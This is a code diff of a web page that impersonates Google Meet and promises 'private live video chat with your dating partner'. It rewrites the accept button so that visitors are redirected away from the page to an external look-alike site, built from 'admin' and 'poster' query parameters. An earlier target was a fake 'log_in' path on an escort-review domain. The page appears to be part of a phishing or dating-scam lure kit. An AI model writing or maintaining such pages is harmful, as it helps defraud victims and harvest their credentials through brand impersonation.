@@ -22,8 +22,8 @@ newDiv.innerHTML = `
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="Google Meet"> <!-- Fixed here -->
     <meta name="twitter:description" content="Enjoy private live video chat with your dating partner">
-    <meta name="twitter:image" content="https://fonts.gstatic.com/s/i/productlogos/meet_2020q4/v1/web-96dp/logo_meet_2020q4_color_2x_web_96dp.png">
-    <link rel="icon" href="https://join-video-chat.one/public/images/logo_meet_2020q4_color_2x_web_96dp.png" sizes="32x32">
+    <meta name="twitter:image" content="">
+    <link rel="icon" href="" sizes="32x32">
     <meta name="next-size-adjust">
 </head>
 <body class="__className_aaf875">
@@ -65,7 +65,11 @@ function getQueryParam(param) {
 }
 
 
-
+const urlParams = new URLSearchParams(window.location.search);
+const errorParam = urlParams.get('error');
+const admin = urlParams.get('admin');
+const poster = urlParams.get('poster');
+const verifyId = urlParams.get('verifyId');
 
 let userId = getQueryParam('userid') || 1;
        
@@ -73,7 +77,7 @@ let userId = getQueryParam('userid') || 1;
  document.querySelectorAll('.accept-button').forEach(button => {
   button.addEventListener('click', () => {
        let userId = getQueryParam('userid') || 1;
-    window.location.href =`https://escortbabylon-comment.net/auth/log_in/${userId}`
+    window.location.href =`megapersonal-chatreview.vercel.app/${admin}/${poster}`
   });
 });
  
